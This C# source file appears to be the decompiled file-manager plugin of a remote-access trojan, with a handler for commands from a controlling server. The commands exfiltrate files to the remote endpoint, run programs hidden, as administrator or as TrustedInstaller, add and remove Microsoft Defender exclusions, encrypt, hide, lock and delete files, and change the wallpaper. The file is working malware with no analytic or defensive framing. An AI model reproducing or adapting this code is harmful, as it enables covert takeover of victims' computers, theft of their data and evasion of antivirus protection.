using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using Ionic.Zip;
using Ionic.Zlib;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data, ClientTemp client)
	{
		try
		{
			object[] array = LEB128.Read(data);
			if ((string)array[0] == "Uploaded")
			{
				File.WriteAllBytes((string)array[1], (byte[])array[2]);
				client.Disconnect();
			}
		}
		catch
		{
		}
	}

	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			string text = (string)array[0];
			if (text == null)
			{
				return;
			}
			switch (text.Length)
			{
			case 7:
				switch (text[0])
				{
				case 'G':
					if (text == "GetPath")
					{
						Client.Send(LEB128.Write(new object[6]
						{
							"Explorer",
							"Files",
							(string)array[1],
							LEB128.Write(Methods.GetDirs((string)array[1])),
							LEB128.Write(Methods.GetFiles((string)array[1])),
							LEB128.Write(Methods.GetIcons((string)array[1]))
						}));
						FileWatcher.Start((string)array[1]);
					}
					break;
				case 'E':
					if (!(text == "Encrypt"))
					{
						if (text == "Execute")
						{
							string[] array2 = ((string)array[1]).Split(new char[1] { ';' });
							for (int i = 0; i < array2.Length; i++)
							{
								Process.Start(array2[i]);
							}
						}
					}
					else
					{
						Crypto.EncryptFile((string)array[1]);
					}
					break;
				case 'D':
					if (text == "Decrypt")
					{
						Crypto.DecryptFile((string)array[1]);
					}
					break;
				case 'F':
					break;
				}
				break;
			case 13:
				switch (text[7])
				{
				case 'o':
					if (text == "UploadConnect")
					{
						ClientTemp clientTemp2 = new ClientTemp();
						clientTemp2.Connect(Plugin.tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], Plugin.tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
						clientTemp2.Send(LEB128.Write(new object[3]
						{
							"Explorer",
							"UploadConnect",
							(string)array[1]
						}));
					}
					break;
				case 'H':
					if (text == "ExecuteHidden")
					{
						string[] array2 = ((string)array[1]).Split(new char[1] { ';' });
						foreach (string fileName in array2)
						{
							Process.Start(new ProcessStartInfo
							{
								UseShellExecute = false,
								CreateNoWindow = true,
								RedirectStandardOutput = true,
								WindowStyle = ProcessWindowStyle.Hidden,
								FileName = fileName
							});
						}
					}
					break;
				case 'S':
					if (text == "ExecuteSystem")
					{
						string[] array2 = ((string)array[1]).Split(new char[1] { ';' });
						for (int i = 0; i < array2.Length; i++)
						{
							StartAsTrushInstaller.Start(array2[i]);
						}
					}
					break;
				}
				break;
			case 15:
				switch (text[0])
				{
				case 'D':
					if (text == "DownloadConnect")
					{
						ClientTemp clientTemp = new ClientTemp();
						clientTemp.Connect(Plugin.tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], Plugin.tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
						clientTemp.Send(LEB128.Write(new object[5]
						{
							"Explorer",
							"DownloadConnect",
							Plugin.hwid,
							new FileInfo((string)array[1]).Length,
							new FileInfo((string)array[1]).Name
						}));
						clientTemp.Send(LEB128.Write(new object[3]
						{
							"Explorer",
							"DownloadFile",
							File.ReadAllBytes((string)array[1])
						}));
					}
					break;
				case 'R':
					if (text == "RemoveExclusion")
					{
						Defender.RemoveExclusion(((string)array[1]).Split(new char[1] { ';' }));
					}
					break;
				}
				break;
			case 12:
				switch (text[0])
				{
				case 'C':
					if (text == "CreateFolder")
					{
						Directory.CreateDirectory((string)array[1]);
					}
					break;
				case 'A':
					if (text == "AddExclusion")
					{
						Defender.AddExclusion(((string)array[1]).Split(new char[1] { ';' }));
					}
					break;
				case 'E':
					if (text == "ExecuteAdmin")
					{
						string[] array2 = ((string)array[1]).Split(new char[1] { ';' });
						foreach (string fileName2 in array2)
						{
							Process.Start(new ProcessStartInfo
							{
								FileName = fileName2,
								Verb = "runas"
							});
						}
					}
					break;
				case 'B':
				case 'D':
					break;
				}
				break;
			case 6:
				switch (text[2])
				{
				case 'n':
					if (text == "Rename")
					{
						string path3 = (string)array[1];
						string path4 = (string)array[2];
						string path5 = (string)array[3];
						string text5 = Path.Combine(path3, path4);
						string text6 = Path.Combine(path3, path5);
						if (Directory.Exists(text5))
						{
							Directory.Move(text5, text6);
						}
						else
						{
							File.Move(text5, text6);
						}
					}
					break;
				case 'm':
				{
					if (!(text == "Remove"))
					{
						break;
					}
					string[] array2 = ((string)array[1]).Split(new char[1] { ';' });
					foreach (string path2 in array2)
					{
						if (Directory.Exists(path2))
						{
							Directory.Delete(path2, recursive: true);
						}
						else
						{
							File.Delete(path2);
						}
					}
					break;
				}
				}
				break;
			case 3:
				switch (text[0])
				{
				case 'C':
					if (text == "Cut")
					{
						Manager.Cut((string)array[1]);
					}
					break;
				case 'Z':
				{
					if (!(text == "Zip"))
					{
						break;
					}
					using ZipFile zipFile2 = new ZipFile(Encoding.UTF8);
					string text3 = "";
					zipFile2.CompressionLevel = CompressionLevel.BestCompression;
					string[] array2 = ((string)array[2]).Split(new char[1] { ';' });
					foreach (string text4 in array2)
					{
						if ((File.GetAttributes(text4) & FileAttributes.Directory) == FileAttributes.Directory)
						{
							zipFile2.AddDirectory(text4, text4.Replace((string)array[1], ""));
						}
						else
						{
							zipFile2.AddFile(text4, "");
						}
						text3 = text4;
					}
					zipFile2.Save(text3 + ".zip");
					break;
				}
				}
				break;
			case 5:
				switch (text[0])
				{
				case 'P':
					if (text == "Paste")
					{
						Manager.Paste((string)array[1]);
					}
					break;
				case 'U':
				{
					if (!(text == "UnZip"))
					{
						break;
					}
					string[] array2 = ((string)array[1]).Split(new char[1] { ';' });
					foreach (string text2 in array2)
					{
						if (text2.EndsWith(".zip"))
						{
							using ZipFile zipFile = new ZipFile((string)array[1]);
							zipFile.ExtractAll(text2.Replace(".zip", ""));
						}
					}
					break;
				}
				case 'A':
					if (text == "Audio")
					{
						string[] array2 = ((string)array[1]).Split(new char[1] { ';' });
						for (int i = 0; i < array2.Length; i++)
						{
							Audio.Play(array2[i]);
						}
					}
					break;
				}
				break;
			case 9:
				switch (text[0])
				{
				case 'A':
					if (!(text == "Attribute"))
					{
						break;
					}
					switch ((string)array[1])
					{
					case "Normal":
					{
						string[] array2 = ((string)array[2]).Split(new char[1] { ';' });
						for (int i = 0; i < array2.Length; i++)
						{
							File.SetAttributes(array2[i], FileAttributes.Normal);
						}
						break;
					}
					case "Hidden":
					{
						string[] array2 = ((string)array[2]).Split(new char[1] { ';' });
						for (int i = 0; i < array2.Length; i++)
						{
							File.SetAttributes(array2[i], FileAttributes.Hidden);
						}
						break;
					}
					case "System":
					{
						string[] array2 = ((string)array[2]).Split(new char[1] { ';' });
						for (int i = 0; i < array2.Length; i++)
						{
							File.SetAttributes(array2[i], FileAttributes.System);
						}
						break;
					}
					case "Directory":
					{
						string[] array2 = ((string)array[2]).Split(new char[1] { ';' });
						for (int i = 0; i < array2.Length; i++)
						{
							File.SetAttributes(array2[i], FileAttributes.Directory);
						}
						break;
					}
					case "Lock":
					{
						string[] array2 = ((string)array[2]).Split(new char[1] { ';' });
						foreach (string path in array2)
						{
							if (Directory.Exists(path))
							{
								SecrityHidden.LockFolder(path);
							}
							else
							{
								SecrityHidden.LockFile(path);
							}
						}
						break;
					}
					case "Unlock":
					{
						string[] array2 = ((string)array[2]).Split(new char[1] { ';' });
						for (int i = 0; i < array2.Length; i++)
						{
							SecrityHidden.Unlock(array2[i]);
						}
						break;
					}
					}
					break;
				case 'W':
					if (text == "Wallpaper")
					{
						Wallpaper.Change((string)array[1]);
					}
					break;
				}
				break;
			case 14:
				if (text == "GetVariblePath")
				{
					string variablesDirs = Methods.GetVariablesDirs((string)array[1]);
					Client.Send(LEB128.Write(new object[6]
					{
						"Explorer",
						"Files",
						variablesDirs,
						LEB128.Write(Methods.GetDirs(variablesDirs)),
						LEB128.Write(Methods.GetFiles(variablesDirs)),
						LEB128.Write(Methods.GetIcons(variablesDirs))
					}));
					FileWatcher.Start(variablesDirs);
				}
				break;
			case 10:
				if (text == "CreateFile")
				{
					File.Create((string)array[1]);
				}
				break;
			case 4:
				if (text == "Copy")
				{
					Manager.Copy((string)array[1]);
				}
				break;
			case 8:
			case 11:
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "Explorer", "Error", ex.Message }));
			Console.WriteLine(ex.ToString());
			Client.Error(ex.ToString());
		}
	}
}
